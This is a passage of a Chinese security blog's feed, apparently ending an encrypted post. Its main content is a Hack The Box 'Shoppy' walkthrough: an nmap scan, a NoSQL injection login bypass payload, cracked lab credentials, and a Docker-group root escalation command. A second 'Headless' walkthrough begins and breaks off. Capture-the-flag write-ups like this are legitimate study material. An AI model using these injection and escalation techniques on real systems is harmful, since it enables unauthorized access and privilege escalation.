dedd112fa2ea6933a3bff1f31da2a1e3196c1e6e6427632a4137c664e551df9bfdcbe138343adb40ebdcd82d73837cc2b464180eec847cfd3ddde420dbf209ec739f4c784a899b425c178bd04ab6bcabb869d145b04bfd50a7a3fbfe795549ebe7be61e61865d1eb88e4ed05029a92c94a6826fa3b6bcc143e3f83a434383524eaa033c8efc6db3c3cfb18d06eb83a70f9eef332d6e21c8b400e1c9e9ff220495660bce7caeb85d0603a282ae93da3d939f2cc380ee34fc0884e743e112ddee74111cfc0379cbbf254a07bb40fdb27b6861f72364ebfdce0a2a28c3a85366373affe460256d4b80a1206978d7b5122028d77590a0ae25f72340050344b732cc9f2236865b1b1926622077d52b2a1dbbba1680b5061e27ff4e40025700fbef2f4e605d8d3d765336a163650a8c5c50b766b370f6bcb499142ebc4e0b5b4c6b66ee42275a690f43610e44c782f7f5b0fcc22e4553472b8c1a31029c7fb2a2408f5bbc9082c7eb745c306b9e7312b3236a626b29f66f1db509efcaefd767b289d64bf03177187c7a16a1449f5315bf0cd098f7c9142e634e5bff3d3a738cbf7ef94c7819955a224d410045a838c85197f0ef4782d7705103191befb9f7d8ecdeb0d62285f2f5d00810e5216e73b8ac4c88da783352413f0aba6e58ce6f1c8c1d7132b5968c6b6e95e50afcbc3109cb8f237271e96fbf6b8754bcca27659ae3a679ab9d96903753e383eed43e03641215b7e4baa0a4cc9b58510b7d7265a20df95c338790fa103a9c5bf849ce9bb4c538c4eb5ace514f6e569efe9c36a4d81e1544e19b96cbb429d7b837be5e97c96024ff38c78a4a4e9917eb161006832851588755826a6ecb7d9022fcdac421b840224572078561bc9f3c882d90aae218931f292ced3e1c9e016b37e56c9d3865f93ecaaea13faf1566e77b27c65ca3f3360298c62f00d5889cd01854e812ec36a4738374851903d17b4dd8956bdc54af4185b5c30ebb67755700d5cb74f0be17af45e22d89a2ac46e4f201daee9d43ec23075a1fffd10332af5f0bcdc14193c1b92614000f4d07d1d65f1ab9d0a853ea44b0c48a46d060f9e939628de8f78735e0a4eeb5d58419ee5b664ef8e71dd6e29400507e549eafb8632ea0dfc7788ae930fe3a0fa15cadc4a981c3bcb059b629374039bea82086277fdc729f91feb828cb68c6cbe7f645133115c5bd8686fc3190ee9361b81769ac241a10b853431b8479bc6a901116ea2a7773190d65353e2309d712e48c3a8226936879410fc4d1130165b162f6c619eb69a0af57f88330b892131757b5c4e9ca3eac5065f1b24df334fe539244f1bd3a4865351bde63ff2a01f2fad272139eeb8c5efa8421cbbe51112755c6c08b146bef7f7675562c77ecddcedbce01e04e7e988b597059406caf202d24528b0dfff007cd85871a4213bc2e42ffad0873d0512e2334306fa0ae359bbf59ea2fa5d57d1a10d2bf1a0460e8eb690c317a65417bf9a6ae0eb6f0993b4111cd8b9c350578eccf207eea693a02f84b3848fb6ee997e4a70db2dbe208111f48bb40c45d4af2b90208bff9a9e60140787fa281de0323278822aa718eb392341628727320721170cecd10901595c49be7c304601c9dee3a2626d615ecd72b85c84f6684e60b70ae16137ad39d7db9254dfcdb6335459abfd55a34d38f50d124f6f0611bc7c41aa3a5a675e3f77494984f04638b5009fe48e9dc4b57ab5ef3631ea17ebbbab293fca5c31c93880985a277c9dc4cad1c22a1d545231473c3c9825f7b66b8b564a6f843afc9d88e4694c43d19f13206d21afa1618aa2856f0e09e3f107ca060ed4041859ab210cdf35862b63609895a67bef8ad4e2824c69137355f6ab4a34f3ba19098d46e015f17b9b338f218ab11804d6b49134691ac0cdace581dc5a168c73dba63eb8f4d451e9f25a846aa0a76d4964df8f5e8ea18e46799a8f086070edd63122cf29d3f15009f7c85b6a5ce5c599d128cf5cabd76d26feb6f1222407a5b0f499d38514bd4f1a3ac30efaf9a95269115b690c6e658d4d1b94f95305f16a45269f46ef95e7bfa78297e0cf55ef57211c1aa9f5a96bef58b87960495f1cb26647f291f117b0456414c5f8c5cd085002dbbf55bb6acbcbcbaea2c874a97d0a4127b4dbb63be82ec4cdd7ab7da3451fa228ee932a527e376bfc013765d727205a90d357bd0241b3ce11fdad4a80e780b14052ef7cfeb46af64a4d28f45074a300309c101404c232f235fd87d03a3745ba62f0edc03270109d04bc7daa542690d7c4cedef5f59cf0a93a2a2bb54af81b13869d5fe8a7f2eb87e0ec0209008c22543d0a5ba45398d3cade497618bc9cf576849c202ece4654fa8fd28cf4ea833be03eb6cf76055ae4b26df5f4bd088eda729d63437c1a43119532c5b1cde4780341ef3a9db694ffccae1397f5811e0f240e8105afeb98fed79cca9db34ee1baf8fa62979babf16e358044db7e0d23d4c6144fbd099ec1b1d0971b2e9b7ce656782c130b2e6a3280ffdae45b49bb09a4e82b406cbfb0980dc3e465b93daee93b6726dee3ac6610758d5a2f9c2b02f5a72270f91c2b3cbeb166e327e7eb5e4e0c300a07f28da54c7b09b678954e963b4aa6a845d8c886d304d070204ddc4fedc0696fbe5aa5db2646e34858a020e7f1e7565ce5ab914d76318d398ac343f07a929a3fc52f458108b606482981b4e6011b6cee70f49845427c5126673c9e92df8c66b12f96210fdbfc003f70dd29fd466833877e89f0e2057a9b26da0d69066761507c97e1645908815f20d1f6c14cb1ae8cc72af31ac539145942b85dcc8af6a7e48099624ae8d7b2e790ef8c41eae2c1582ef3cd24e7280aa5a373c604f9febf723478a73bf527fb0948b1f25129c0959fc57803b5e76b5c2807a0d13bc038a599d21574b906e7112d56c9368b230eaf85cb01298f1e4c82d63e3fde82d0b50a58dd566a26c899716f23d879ce16dd131dcf4154b4e23cb82993e6ecd4e5e65df47acb8430fd7bed6aa9bcb40b37c0a2d4e622131cfadee62e31fe9c22751886c54029adc0c5360dd8696915198968ca4f24108d9cfdc45c7872a10d9607db70b1523d93b9736100d77e38b222d9214c53cb8cdd3a2bf2eb48775bf3b54eb360e1ffdf4b8748918d803bb8e671dc261ff047889d7b02845fbe9aaa6cb0c8d1cb78c4183fb9a1afabe0cf66a3bcfa20f260a3e8001f4858af509e616539f28a4f43b9fa001fe730ab186d026194dbf5fe7cd14876bca1d079b5e714c1f64c8594cd536b8a804356275a397b0d7c0454c5e1fa5fdd8a0a0467792ca8731d46cff6008d8cb003802ba61fc437baad7a2df98264bcb6f5ac12a7de7c919c25864a9974ee6fbcd1a515769e3d6b880698366cc9d3005c7f9727afb388f3c0a42cf73023dd86a730efcfabbf7432170eddb3702bfbdc53d0da3c7b146aff94c82d728fe39adc9e27ed488ba583c97567152c80ebd8c08c137dd5260ccefb906ebba4079fb91e9a231d697168822c63a61535da0f9155cb05033f1fa7ad7b228886093592ee953ccfc6929865c9fca741305c2e3233cf15e3c7215d293c12fcef3e90f81851772cc53ad54b9d59710712313f7caec1a5189ad158c7bc0f38e10f2b5fc370035ab745912053dd1e37c4473eb005a6974a89256cfa655ec56aa738d948f66648e532e486bf6363b1abc834f5659e8d44db0e39b92586f142a0fb6da6c45cda55f2f3d067bbe596232d6d18297bc07eb1bc58c4d31959679877a0210d2a916de6b137d16c46b9ccf288f18158a00144a51668e1677ac26f83a9b34ea029c279f638d99e7e6b4dcfdea451964e8eaf68a295160c0fbfaa6e60949c808c9f46bc5bf092577b14ea239d95a952842ccac89f183e76da29526bbeb828aa3b3ad3c6a6c0202b5f808c72dcc8fc0af5f4dfc4dab3cb84ae32d7dbdca821a65e0c38cb8ef2f05980aa7b88308a5e3de293e1d164b3f094a49b5399c77cdcda004223ce00161088a9179fd1737a24d07f03cfec22740c05146a21c4cdcbda4f0e8ccb72f2c87addd5efee0c96579b4b2d30b0048c26d214a00765a231e00fc18271be224be45ba61f4b05e864b2a5913507a45415d876e2668d18f64dc87ff4cb8538b9f3e1b3e0c97d2046fa4cf15e02c75a64acd4f720502ce2fa949f72602d9e99b453e38888ae9ef1dff504af727e8e6ea911ab3717259329c667fca807d24dee88592b34c3635d2d8330d845392781f60ce96053f4996f0dc1b04ad2787aa987921cfd18366ef8451e7faec702fe3abe61318c92e2cc4487c35a57563e22cc000abde6df3eb6b33601de52bf8f5be1a775b822c6d670a57971b3537101d885776a5d4a73073b5b0f0bfb4dfe86e4d09661dbc42eea8b8fcf50951d8d7972cc05810e1d0ccefd55c6872b52aa1c4c09bcff7597d37975e9b791b035bb006d6d119a576ad33e81c65fbd17fa341a02a80b89f6f0186617cbcbcab482434c29936a1c06768c645ba2e407b4077323718bed9408099c8ec7d6dbbf14d57f7a78772260bead52f151c25d26bf5e68f9bbbe17f756daa022673d57ea93f57d69709cbde03af1c60c1f8c5ff8c6052389f3da45e9978cce861fd51ccf58e13c2ba7206ca0f0bfacbeca191ca76b7aaecc9fd934953a49458e53c53442fc36e47a3280672d90fca781b1f77a07061692cf432859667886f5de3d57f4c3accbdf12158edb85a0f110292410e1a7efc7c4c97a9c9bba45e59835f258de706519f67d2cd5cd4f8532b196b6975aaf4a6934a56a1cb4460e4b28254862bee4f60b8019632c7a0eaf1dcf78a1aaadd46f08c4921cf87582c433b5a486a8ef64f0474b0fca62b6951a7a9edd6fd31d0c0d674c9d3d60b4bffa54dcd73943580d554a4fc8b6cef4c233d77064b665c2585ed63b5b763016017a5edcdffc0fc21ee0ac3de02583aff6369db860a68403c51976d82bcffd5868477c926111fc5aabe7d4e7c1b187598a0f96409112620cb916dc97c22964fa790f6d59198bae774240442fa03463bad297873f4e2e57826fc0bdf792a89ea65cdedeadcbbaad1c97c7d555339c5f3989827edd276c6d1130065c6f13f934dda72e40c961f66d7e31d1e14139d42faa32145798b95a69377ea63cf3950faa3252be1e11fd9477f393158e6ec39495db44f5f725d7af033511c75fb7cd3ec71f81399529eb7cc3eac5a97d507b0e80c03d67202650cace6c1d66334c5a25c2c89decb6dcfb2575d9cdf8065cdbd0f591a8595cd4509c1783bb3658fa7faff9937160f94861274ebc96ab3465ee4a6c0d3bf45ea6673883f435577589f4e6f2c0062af4832e0f659f4542c805d8ec1645452d69021b29ea05f98abdc2c35eb926809abfebfd62966c130af55402299764e9aecaf534c390c6944ca2d0292b781244a85d3b3db785f0eff688defe22f29946a19462d81207a02aedb85836f8c3045c51b11c8e8e87003adaeb413b6420fdd9447578ac6ad105b52c1eee5f4a148c143b408c09f3f77c7b9c294cb9c451d99657fb7253d7195d367695a23ca9f1930d3e3a1ec71c8e3a27c8db083535437e81f4488ee5ca054b8cb28dd3dd2f0c87b042ba2aaa761b7ff159f96ce628c6ee6042f6ecc6ab5ac11a875d339078ece36a1745c0c5506619029ceeeb9870411ad80362432a18be2943c958112b1b2f178e34e0aae07672f52b72ee1c8bcc36c7b69ab51c4731b5518140463759a3bf689bd8da0687ec51c922be66a330aba7ca08fa067ecc80615b6b11f3a5b25e88c32a1dade1f9229a8791547f4616305356e45d5718ff7147d32d99a30c51af292ae3477771d087edc190b7818949e70869c1fdbfd418be2c1f7947586f0901e9520f7860f1c079ed7da910059d8a3064a89dde1ee6cb3f0da36f620f5f502cb77446cc78ada8d3c0060be20fc4ce210978e6a7008c112c161deffb485956742927faaa0e5c83b8f80bb6a632ca310a65948511a4d252764dae06902a51887eab91c330ad6c5309fcdac2d6ac6946a65febf5e187a42cba8df1853eb8b2e8a6ac35a580308ff79bd51aa6684af163d3aa58140f8e098fb9626d347e54b74d8c7783e67db63ff68fc6892e915ae9c8571b5bd7b876f7f60bfa14b81a7b04d1393a77ecc4281aa0411454e7ebe5134a21b438722caac862523e4a4f8e22e95f0096c531786d331e1749e36ddc6587dd4464aafe0288e38929be3fd797cfcb52b47009041e42278af06430f8d04eadc0dfd40a5fe34a9ea2dc2513db5b4c2d2fbde9267ed7b56ceaac16d06ba37ea96195a97fda6dad660bb53019340413aa1d994f2edc8c56cbd3e04658c9c1f4439fb5765c94d374cc456aeb92e29ca85db1c20b7d9152aafccab156dd1eabfc077060c49edc922d14663590ee646577cc7f73547bc390987bd412261b6d56cb0301134bdb10ca6803c074477fc9f810dc8ce5ce9d30bf1af1064d093ce516bb61b234cddd1f1fe5eb7641e48f59b84ecb56efb37f7da0fbfc99d4f5ecccb6f41d9c6b155c6166aa1daddb8702bb281cb88a8b62b710b86ef30259ba5cbdf26593fd3a191fedd24dea8999039bc57274c8ca3078a079cc9be3180b2997ae4adb63c91d9c314d61c45d5693343645d8d5b39b20d84ed6481a9a7349cf620f04bbf5f9420c4f0ef2b52733369a5c04fbd04bb968c8d211084256e5158eeca1006b624cf047865602745c29cc1fd71a78ce497fca9c116106776186a1c492535053beaa24b437b3a9e715a7701d13bfe6000e0da6a6748b549a9b79cc0c0205c8f651894d0ec4a50f282d6156057edcf3d055cefbb6a691df16d333a5753dcad2f302d7f4140a4ef0f940af57ffb8866029f012a489bc6eadf57ad2e6ecf246ea5371970646232b286fff8b59c5205828bc4f976ef0115c3e6386273504c8edf2a1cd63ac2ac0dad334b8bd1c78d4fcf41cf8677f1b9172c4cfe9bdc58bfc6fad89dee52e6dd22b4148001910d2b7c2eac686e21a758f3a8373e0b5fd73b4bdc08b291bd610844c0cd8ed5094c9d64867362725a3c31f6538d184a20414998bc75d535b73264bd3b0956e96c5edfe6b96f2b8427df8ddc3aa4b6ca3d9b38680eeb28300a14395779d82f011dc112b7aeac0742b3cd7cad93f8b88f1f975b0ac681bc0a25882fd9d0de3f5abf72e78c974f0873ad7f33e0147644c0b5e3811b68434726e048057d5b5a1e437a580a976ee48b1313ff25bca5f851256c7dcbf0f67be95f38c77beae71e7a78c92704f0e5d64b98049bb078b14c2da19d978447584c5c4e8be47f469aa2197207ecebe00c5de7c63ac60ad2a968179e8f03755fbeecc9fdaae6b585360b1f5a4f58c578f5d670519508c27cc3a123f3060befa6561365a4ce513e131c911391d97376d431f99266212aa82699f148d47ba1eef7de772b07a8d3dcd7520193ac6b5dff19eb7bfadd2362bd4877d6dc46a39bf17b3e1c6eb25bbec5817f0f4e807d40fc0facd1ad2ded3a48890e05b228abb9032cf120e26d7f6a157204f099a85011134fb4a3244e452e27d60ec684bb6d18d544150d197fc791deeb6644aa5a2a5a3d2e4816d969051f0cfdcff4224d57a0d78fd74e7e600c90eaa71b05a0ce4181ff223a33fc33f6d1e02ece29343bed8cd5f5abe4a8432aa8db89896324fc3df1d665b61231f6612ef3ea3c667200a7ec6b85b0486870cf3696bfdf7fdbed64b0207dc205016d38209cd7ec91f685f1883f1e597cddb281e2f23e712de829af8e2b2c6bac244b1d2da0aeda707fdc2869962c0df5b82bbf74ac1bacff4838ed65a70868fb1785a37fb299be95fa4f7e7b5371ebaf37da9e637bc9f3d1c25a9748809aa88faf7abbb8e021fb41158ef03f9c2465d25d308dd7ef59eaea9f408d1a727f8b7d51592d8de4199dba087902b457ec99e41c63ca785130f6efb4924306c7944706ee17a3426745d0cfeda706c2aee76ed9817644c31be9481b5c90d13d9ba0757f90014d7c76a7bba25e6f6d3426393a3de843925dd69a883756ecfe5b00f4a5a60a5fdee9aea6354a35e45dda10f22b96a8429663170c4e5c5d6e37f42b2b3debcb7282093ba3a08cd62ce02d914c8d8f83130349d6f737afd67b32dae60e6d004fbe28578cfa9da6dca575a0b3fd77e6cfa59274c495cbbedbddde3786f27044acada9529b09a1c412563762d4d91d3384a9dfc7d5ba778c567719c87ed227d1f3b4e3eeddb25c8411db5755529cc70483641eab64ec430df607c632fe45575576d8330d0df2d9bdb035fbf54346982ce1c0ecb5207111743dc6e23b197149a44cc62777da46db6cc9673f1d76fa9c377894efcb23038e06a11b2c72c39348c72146f79abd3d885e0e80efae911fbe84e36bc33b6a6f4dbceecbcea3e20ff37674a1d817a64c85e30cdd3528113d77e6b4aaff49b2a709eb4a9dfc6e510b982801bc519a861cb4d4a8fc304d0f94004af9da07b6d50bfd99f983d52a026004804898f4450f5c0e912b9bb251115dcb69c1a5c9acb814dd033b41eed9bec4e3617e8c513fe08791f75be83c91ba6e35175181e877b636f89770b47aeb93d46919ca5a6b5a4022ec95b5d8c683b5fea9e795f7096943a37e48d6058a88da934e5a83e2e7b6f5348f98ed803622d4432fa6daa55f92879d5e4232d567181f1a6402a3ea243e6030f46c6493eff114c2a7e301ead74ed0e526db4482f6129477a87977abb3032360273a7f9aa5fc3689ed01d975c8719d729c379d42d506f903b2fdc2e2816b501f0a943969564d74700c60ead40baa4825e066ed46ae99b9e336ce2c4f25f01aea55280820349ab0d2e769926a325e90d729cf8d2129baf3578651ebef667d9a45560f04739d1ab038c987f8088b09255ea0d9755dfa255565c2b0603798fc4c7a30c070d3c03dd1e58f7beb385da9681242d55dd3f59e4ee86c32fcd682308f5ea3c09cabd384161fef77c555b13366017604001efe3e443a382ec8ea07a2924006d4639e13cfa6898ae08947c0231a7c0b1ea893bce8dbd890859009645946e72ac5fda33e22203c584ee31621b647309044e9f15e7399e83fa80db0a60595c6c3333a64c4d83a6c4ad370fb394532b927a14075595e21948fa223395e4ae2afc4dd82f7af8e2113d0aebe1463502cb84c8c5a4ac200b1045bbff5d544433756a9739f77880a24821d15994f7a53f172bce5b29623a7b522aa5ba1c9c420359ff0615e565d6976d9770ad08fc617cc61cd3a99fcb5d8d1a7819444be14dff3590c302786864c72083e4b2424515c6c0de9937e03b1ed103691aaf8caca8790afbdb7029bce999f003c55f139db164e4225d82ca56f6ebd1d54c57b25e75c5a19e1f80a7711f65a18126a1f6d917d072c58c3722748fb825a3575243cc600ffe7038505d17ea92cd358ef8fbdb71e297a33f8b44643d3169b00fbadd71c3fd56ee6ddfc2d9e053c94a83e4820a2e87df8be4360c46f39b87edbcced2583982d2d78580249412414b79bfefd49dae7826e2f4ab52eeb3b260a2da025cb3cd2bfc9b18b652e4948d50bb58e859dcc41951b29ddcc4c0a9233c2b7db71edabb0af11e552d92a549a9ae3dd028b7fc33227e3585c1b2bfe0e80c1a4ce48e01f5ffa6a252539889dc6c421f51fb7e84933f8293081029033f1b191c74ce163d35888f4801d287f8a474e56939ea7d3d685a82484cb3dfcefd3ef03c5db6640bc8a8138321dac1e604df55ea6b66373c74c23c3e166b8b7ffe8dcae20eedfe4d41ff07adb609bbab983602c7050c3ca441ce1d4896ca4791cfd5e9052c2d35f4808b78279d9137bb554f6ab684429606b70330bcf9c375facd9e2be4a0a5069c221d0875634a2ece07a253e0423be68b8bfa22962c570ed178dc936b65cb3731f9df1294115e3edb994e0355ab230b77ef4dcf17563e3250d530297b2050b4bd2a5ad863dc1855303e250c15cdaa75502265de796b31b44d57fe04bec221c7605ca09618981ed52c649a3d5b762b72bb72b1f3e5d549c33ff5db2ea3a1652ed84eb8671fb292d6be2739372d95a35516a25ddaec2dc35f5caf1554099247495169f00cca7e5fb01ac241c1b70571b265e849997615a7a6367e38defd156f889b2fd62bf5f0b2d3e26f261fb8bee166384eab394c3fdaf77871ec38ca6f5d1844ab0693c36a2d41645788c9f764803fd8eed31e7ece9a2c743f81b455968006ec6b0aaf719f146acf0e1737928a4be432b6139a9c04294dadcf8ff3723e82d6352128e6dfe946cc57dceac54e4b7ff9d1b11c69458bb86c6455c6194b2ade37bad6513fade457889bdc5b3d43336e13a743f23c828ff8b6413a2065cc8efbb88135612632be82566652ee6a8418230b5f556b3fc95c48da3edcc94b5c3293426e9c310644d37b8d6a6ddf412b968abbc24b5ec225813222ce625899aebb5f2fb3de45a8d8edf88b8341ff2b47c9cdbb786cfb13d34da550c8eb0b762ddc6839b8cec46d7b89cdfa4ff14eda9e7ca58f3393ab2144ff6b4beff38bf28b71b169a62c606962350781deba125d48e9d699529296ef4ed496d45cded30141a9075f21e0d3e6b0c1729f788d9f31bf0895e181c91521ceda44515651e853d3ff133afba62e2985c1ffad7dc88c8060bedd605293fdfe4748ea41938d568db41dd79538a96ac84e052056130f3ddb0f1737380ff237b546e8e86f8756425258ddb17106a6a434142405702ada4f9dcf1ca772737a059fb884aa0df22fd5a60e03f5c002709da356060dfae2916d102e801e63b037ecf9d704b98fa0498725ab056525ab8a52bf2f1e1bc72be9e9f62d870e1aa268248522f4874c21df31e19519fe32c3e624182a9e81fe1ed40c151b1bae32af89cc67f03791a7f9a616bc1414373462ec0a14113f540a0761871dac68e7c9151525c35c417d5fe46d8e12fcb396ce2495e8ec</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>htb</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>htb Shoppy复盘</title>
    <url>/2024/09/13/htb-Shoppy%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─# nmap -A -p- --min-rate=1000 -T4 10.10.11.180</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-12 22:56 PDT</span><br><span class="line">Nmap scan report for shoppy.htb (10.10.11.180)</span><br><span class="line">Host is up (0.38s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA)</span><br><span class="line">|   256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA)</span><br><span class="line">|_  256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519)</span><br><span class="line">80/tcp   open  http     nginx 1.23.1</span><br><span class="line">|_http-title:             Shoppy Wait Page        </span><br><span class="line">|_http-server-header: nginx/1.23.1</span><br><span class="line">9093/tcp open  copycat?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   GenericLines: </span><br><span class="line">。。。。</span><br><span class="line">OS:=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R</span><br><span class="line">OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%</span><br><span class="line">OS:RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)</span><br><span class="line"></span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 53/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   407.75 ms 10.10.16.1</span><br><span class="line">2   407.83 ms shoppy.htb (10.10.11.180)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 235.39 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>开了三个端口，9093端口访问后看起来像是配置文件，没找到什么有用的东西（后来看别的wp说这能看出这台机器有mattermost服务）</p>
<p>有个域名 <code>shoppy.htb</code>，扫子域名扫到mattermost，都添加到hosts里，mattermost这个域名需要账号密码登陆</p>
<p>shoppy.htb这个扫目录扫到登陆口&#x2F;login，然后看官方对这个机器的介绍是存在Nosql注入</p>
<h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><blockquote>
<p>Nosql注入介绍以及payload</p>
<p><a class="link"   href="https://nullsweep.com/a-nosql-injection-primer-with-mongo/" >https://nullsweep.com/a-nosql-injection-primer-with-mongo/<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://xz.aliyun.com/t/9908?time__1311=n4+xnD0DuDRDci730=D/iaRmxjhhIWDRxD5t4+Qx" >https://xz.aliyun.com/t/9908?time__1311=n4%2BxnD0DuDRDci730%3DD%2FiaRmxjhhIWDRxD5t4%2BQx<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://book.hacktricks.xyz/v/cn/pentesting-web/nosql-injection#sql-mongo" >https://book.hacktricks.xyz/v/cn/pentesting-web/nosql-injection#sql-mongo<i class="fas fa-external-link-alt"></i></a></p>
</blockquote>
<p>是通过什么判断为Nosql注入的呢？（参考思路：<a class="link"   href="https://arz101.medium.com/hackthebox-shoppy-64cbe52964ed" >https://arz101.medium.com/hackthebox-shoppy-64cbe52964ed<i class="fas fa-external-link-alt"></i></a> ）</p>
<p>login发包是post发送username和password两个参数，按往常那样测试单引号，每次都需等待很久的时间然后返回504，直接sqlmap跑也无效，当我们随便访问一个不存在的目录时返回的是，这表明这个web在使用路由</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913140659.png" ></p>
<p>所以可能是在使用Node.js，他存在使用Nosql注入漏洞绕过登陆限制，经过尝试，可以使用<code>admin&#39; || &#39;a&#39;==&#39;a</code>绕过</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913141054.png" ></p>
<p>登陆后跳转到&#x2F;admin，主要是有个search功能点，没找到别的点了，搜索admin，给了一个json文件，里面有admin密码的哈希（爆破不出来）</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913141517.png" ></p>
<p>但是不知道有没有别的用户，继续使用Nosql的payload<code>admin&#39; || &#39;a&#39;==&#39;a</code>，这次多看到一个用户的密码</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913141635.png" ></p>
<p>爆破后拿到账号密码<code>josh:remembermethisway</code>，成功登陆mattermost那个域名的登陆口，在聊天窗口中找到jaeger的账号密码，ssh登陆成功，拿到user</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913141843.png" ></p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>sudo -l看到 <code>(deploy) /home/deploy/password-manager</code>,password-manager是个二进制文件，strings查看，貌似是输入正确的密码后能拿到deploy目录下的creds.txt</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913142207.png" ></p>
<p>传到本地，ida看了一下，密码就在源代码里，<code>Sample</code></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913142251.png" ></p>
<p>输入正确密码后拿到deploy的密码</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913142327.png" ></p>
<p>登陆deploy输入id，发现deploy在docker组里，有相关的提权方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy@shoppy:/home/jaeger$ id</span><br><span class="line">uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>docker提权参考链接</p>
<p><a class="link"   href="https://www.cnblogs.com/kqdssheng/p/18275541" >https://www.cnblogs.com/kqdssheng/p/18275541<i class="fas fa-external-link-alt"></i></a></p>
</blockquote>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913142636.png" ></p>
<p>有个docker提权的漏洞，大概思路就是<strong>创建一个新的容器，该容器中挂载了整个文件系统。在这个容器中，我将是根用户，因此可以完全访问容器中的所有文件（包括完整的主机文件系统）。</strong></p>
<p>​	•	docker run: 运行一个新的 Docker 容器。</p>
<p>​	•	-v &#x2F;:&#x2F;mnt: 将宿主机的根目录 &#x2F; 挂载到容器内部的 &#x2F;mnt 目录。这样，容器可以通过 &#x2F;mnt 访问到宿主机的文件系统。</p>
<p>​	•	–rm: 容器在退出后会自动删除，不会保留临时文件或容器。</p>
<p>​	•	-it: 以交互模式运行容器，并分配一个伪终端。这样你可以在容器中运行命令并看到输出。</p>
<p>​	•	alpine: 指定使用 Alpine Linux 这个小型的 Linux 发行版镜像作为容器的基础镜像。</p>
<p>​	•	chroot &#x2F;mnt: 使用 chroot 命令将 &#x2F;mnt 作为新的根目录，将容器的根文件系统切换到宿主机的根目录。</p>
<p>​	•	bash: 运行 bash，给你一个新的 shell 环境。</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913143024.png" ></p>
<p>于是我们可以成功读到root.txt，后续也可以通过读取shadow或是ssh私钥等方法来获得真正的宿主机root</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这个靶机还挺有意思的，主要涉及到Nosql注入和docker提权，都是第一次遇见，过后要好好消化一下这两个知识了。。</p>
<h5 id="推荐阅读wp"><a href="#推荐阅读wp" class="headerlink" title="推荐阅读wp"></a>推荐阅读wp</h5><p><a class="link"   href="https://0xdf.gitlab.io/2023/01/14/htb-shoppy.htm" >https://0xdf.gitlab.io/2023/01/14/htb-shoppy.htm<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>复盘</tag>
        <tag>linux</tag>
        <tag>htb</tag>
      </tags>
  </entry>
  <entry>
    <title>htb headless复盘</title>
    <url>/2024/04/05/htb-headless%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<p>刚开始接触htb，感觉很有收获，记录一下</p>
<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://app.hackthebox.com/machines/Headless" >https://app.hackthebox.com/machines/Headless<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：easy</p>
<p>IP：10.10.11.8</p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>扫到22端口和5000端口，5000端口是upnp服务，要用http协议访问</p>
